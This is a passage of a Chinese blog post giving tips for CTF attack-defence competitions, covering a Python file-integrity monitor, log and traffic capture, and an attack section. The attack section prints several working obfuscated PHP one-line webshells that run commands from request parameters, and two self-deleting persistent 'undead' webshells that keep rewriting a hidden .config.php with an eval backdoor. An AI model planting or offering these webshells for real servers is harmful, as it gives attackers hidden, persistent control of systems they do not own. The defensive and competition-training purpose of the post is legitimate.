class="line"></span><br><span class="line">    <span class="keyword">if</span> noneToNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> NULL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isListLike(value):</span><br><span class="line">        value = list(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isinstance(value, unicode):</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">elif</span> isinstance(value, basestring):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    value = value[:ex.start] + <span class="string">""</span>.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> unicode(value)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> unicode(str(value), errors=<span class="string">"ignore"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录创建</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir_p</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> errno</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前所有文件路径</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilelist</span><span class="params">(cwd)</span>:</span></span><br><span class="line">    filelist = []</span><br><span class="line">    <span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</span><br><span class="line">        <span class="keyword">for</span> filepath <span class="keyword">in</span> files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    <span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算机文件MD5值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcMD5</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filepath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            hash = md5obj.hexdigest()</span><br><span class="line">            <span class="keyword">return</span> hash</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'[!] getmd5_error : '</span> + getUnicode(filepath)</span><br><span class="line">        <span class="keyword">print</span> getUnicode(e)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyError, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有文件MD5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilemd5dict</span><span class="params">(filelist = [])</span>:</span></span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            <span class="keyword">if</span> md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    <span class="keyword">return</span> filemd5dict</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份所有文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backup_file</span><span class="params">(filelist=[])</span>:</span></span><br><span class="line">    <span class="comment"># if len(os.listdir(Special_path['bak'])) == 0:</span></span><br><span class="line">    <span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[<span class="string">'bak'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'---------start------------'</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    <span class="comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span></span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO 备份文件可能会产生重名BUG</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'[*] pre work end!'</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        <span class="comment"># 移除新上传文件</span></span><br><span class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">        <span class="keyword">if</span> len(diff_file_list) != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># import pdb;pdb.set_trace()</span></span><br><span class="line">            <span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = open(filepath, <span class="string">'r'</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[*] webshell find : '</span> + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[<span class="string">'webshell'</span>], ntpath.basename(filepath) + <span class="string">'.txt'</span>))</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filepath)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = open(os.path.join(Special_path[<span class="string">'log'</span>], <span class="string">'log.txt'</span>), <span class="string">'a'</span>)</span><br><span class="line">                        f.write(<span class="string">'newfile: '</span> + getUnicode(filepath) + <span class="string">' : '</span> + str(time.ctime()) + <span class="string">'\n'</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[-] log error : file move error: '</span> + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 防止任意文件被修改,还原被修改文件</span></span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        <span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</span><br><span class="line">            <span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = open(filekey, <span class="string">'r'</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[*] file had be change : '</span> + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[<span class="string">'difffile'</span>], ntpath.basename(filekey) + <span class="string">'.txt'</span>))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[<span class="string">'bak'</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filekey)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = open(os.path.join(Special_path[<span class="string">'log'</span>], <span class="string">'log.txt'</span>), <span class="string">'a'</span>)</span><br><span class="line">                        f.write(<span class="string">'diff_file: '</span> + getUnicode(filekey) + <span class="string">' : '</span> + getUnicode(time.ctime()) + <span class="string">'\n'</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[-] log error : done_diff: '</span> + getUnicode(filekey)</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print '[*] ' + getUnicode(time.ctime())</span></span><br></pre></td></tr></table></figure>
+<h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p>可以在机器上利用tcpdump进行流量抓取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -s 0 port xxxx -w 1.pcap</span><br></pre></td></tr></table></figure>
+<p>追踪下tcp流，溯源</p>
+<h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>php脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>);</span><br><span class="line">$ip       = $_SERVER[<span class="string">"REMOTE_ADDR"</span>]; <span class="comment">//记录访问者的ip</span></span><br><span class="line">$filename = $_SERVER[<span class="string">'PHP_SELF'</span>];   <span class="comment">//访问者要访问的文件名</span></span><br><span class="line">$parameter   = $_SERVER[<span class="string">"QUERY_STRING"</span>]; <span class="comment">//访问者要请求的参数</span></span><br><span class="line">$time     =   date(<span class="string">'Y-m-d H:i:s'</span>,time()); <span class="comment">//访问时间</span></span><br><span class="line">$logadd = <span class="string">'来访时间：'</span>.$time.<span class="string">'--&gt;'</span>.<span class="string">'访问链接：'</span>.<span class="string">'http://'</span>.$ip.$filename.<span class="string">'?'</span>.$parameter.<span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// log记录</span></span><br><span class="line">$fh = fopen(<span class="string">"log.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line">fclose($fh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>一些日志分析工具</p>
+<ol>
+<li>LogForensics 腾讯实验室 <a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="noopener">https://security.tencent.com/index.php/opensource/detail/15</a></li>
+<li>北风飘然@金乌网络安全实验室 <a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/126698.html</a></li>
+<li>网络ID为piaox的安全从业人员： <a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/110644.html</a></li>
+<li>网络ID：SecSky <a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/8982.html</a></li>
+<li>网络ID：鬼魅羊羔<a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/96675.html</a></li>
+</ol>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>主机发现可以用httpscan这个工具</p>
+<p>端口扫描用nmap</p>
+<h4 id="口令"><a href="#口令" class="headerlink" title="口令"></a>口令</h4><p>比赛刚开始拼手速，前面提到了一开始需要先讲本机ssh密码和mysql密码改了，同时队友可以试试其他机器的，万一所有机器的口令密码一样就美滋滋了</p>
+<p>除了系统层面的口令外，还要考虑下web后台口令</p>
+<h4 id="常规漏洞"><a href="#常规漏洞" class="headerlink" title="常规漏洞"></a>常规漏洞</h4><p>sql注入一般没有防护（对方部署的waf除外），可以用sqlmap跑</p>
+<p>上传漏洞也可能只是简单的黑名单或者解析漏洞</p>
+<p>文件包含一般可以跨目录读取flag</p>
+<h4 id="非常规一句话"><a href="#非常规一句话" class="headerlink" title="非常规一句话"></a>非常规一句话</h4><p>一些非常规的一句话木马可以防止对方通过你种下的一句话来攻击别的队伍拿到分数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="number">2</span>]).@$_($_POST[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br><span class="line">连接方式：?<span class="number">2</span>=assert</span><br><span class="line">密码：<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=chr(<span class="number">96</span>^<span class="number">5</span>);</span><br><span class="line">$b=chr(<span class="number">57</span>^<span class="number">79</span>);</span><br><span class="line">$c=chr(<span class="number">15</span>^<span class="number">110</span>);</span><br><span class="line">$d=chr(<span class="number">58</span>^<span class="number">86</span>);</span><br><span class="line">$e=<span class="string">'($_REQUEST[C])'</span>;</span><br><span class="line">@assert($a.$b.$c.$d.$e);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">连接方式：?b=))<span class="number">99</span>(rhC(tseuqeR+lave</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $sF=<span class="string">"PCT4BA6ODSE_"</span>;$s21=strtolower($sF[<span class="number">4</span>].$sF[<span class="number">5</span>].$sF[<span class="number">9</span>].$sF[<span class="number">10</span>].$sF[<span class="number">6</span>].$sF[<span class="number">3</span>].$sF[<span class="number">11</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>].$sF[<span class="number">1</span>].$sF[<span class="number">7</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>]);$s22=$&#123;strtoupper($sF[<span class="number">11</span>].$sF[<span class="number">0</span>].$sF[<span class="number">7</span>].$sF[<span class="number">9</span>].$sF[<span class="number">2</span>])&#125;[<span class="string">'n985de9'</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>($s22))&#123;<span class="keyword">eval</span>($s21($s22));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">连接方式：配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs= </span><br><span class="line">连接密码:<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h4 id="维持权限"><a href="#维持权限" class="headerlink" title="维持权限"></a>维持权限</h4><p>不死马，访问后会一直生成.config.php的一句话。解决方案：重启apache或者写个脚本一直kill这个进程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="string">'./.config.php'</span>,<span class="string">'&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?&gt;'</span>);</span><br><span class="line">        system(<span class="string">'chmod 777 .config.php'</span>);</span><br><span class="line">        touch(<span class="string">"./.config.php"</span>,mktime(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">28</span>,<span class="number">2016</span>));</span><br><span class="line">        usleep(<span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个不死马运行后会删除自己，一直生成一个.config.php，和上面的类似</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">   set_time_limit(<span class="number">0</span>);  </span><br><span class="line">   ignore_user_abort(<span class="number">1</span>);  </span><br><span class="line">   unlink(<span class="keyword">__FILE__</span>);  </span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;  </span><br><span class="line">       file_put_contents(<span class="string">'.config.php'</span>,<span class="string">'&lt;?php @eval($_POST["password"]);?&gt;'</span>);  </span><br><span class="line">       sleep(<span class="number">5</span>);  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>不死马的解决方案，先查看进程对应的pid，再执行以下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	$pid=<span class="number">1234</span>;</span><br><span class="line">	@unlink(<span class="string">'config.php'</span>);</span><br><span class="line">	exec(<span class="string">'kill -9 $pid'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="一些小tips"><a href="#一些小tips" class="headerlink" title="一些小tips"></a>一些小tips</h3><p>当怀疑某个进程是受到攻击后创建的shell进程，可以分析这个进程是否有socket连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -antulp		#查看连接internet的进程</span><br><span class="line">ls /proc/&lt;进程pid&gt;/fd -l | grep socket: | wc -l		#查看指定进程socket连接数的命令</span><br></pre></td></tr></table></figure>
+<p>类似的可以查看是否有管道连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc/&lt;进程pid&gt;/fd -l | grep pipe: | wc -l</span><br></pre></td></tr></table></figure>
+<p>如果有连接，kill掉进程</p>
+<p>最后祭上表哥的导图</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fsor5ddnfrj312f0p0q4s.jpg" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/小技巧/" rel="tag"><i class="fa fa-tag"></i> 小技巧</a>
+          
+            <a href="/tags/CTF线下赛/" rel="tag"><i class="fa fa-tag"></i> CTF线下赛</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/26/SSRF补充/" rel="next" title="SSRF补充">
+                <i class="fa fa-chevron-left"></i> SSRF补充
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/07/20/捡肥皂-SOAP注入/" rel="prev" title="捡肥皂--SOAP注入">
+                捡肥皂--SOAP注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#防御"><span class="nav-number">1.</span> <span class="nav-text">防御</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#修改密码"><span class="nav-number">1.1.</span> <span class="nav-text">修改密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#备份"><span class="nav-number">1.2.</span> <span class="nav-text">备份</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#删除后门"><span class="nav-number">1.3.</span> <span class="nav-text">删除后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#部署waf"><span class="nav-number">1.4.</span> <span class="nav-text">部署waf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#流量分析"><span class="nav-number">1.5.</span> <span class="nav-text">流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#日志分析"><span class="nav-number">1.6.</span> <span class="nav-text">日志分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击"><span class="nav-number">2.</span> <span class="nav-text">攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#信息收集"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#口令"><span class="nav-number">2.2.</span> <span class="nav-text">口令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常规漏洞"><span class="nav-number">2.3.</span> <span class="nav-text">常规漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#非常规一句话"><span class="nav-number">2.4.</span> <span class="nav-text">非常规一句话</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#维持权限"><span class="nav-number">2.5.</span> <span class="nav-text">维持权限</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一些小tips"><span class="nav-number">3.</span> <span class="nav-text">一些小tips</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
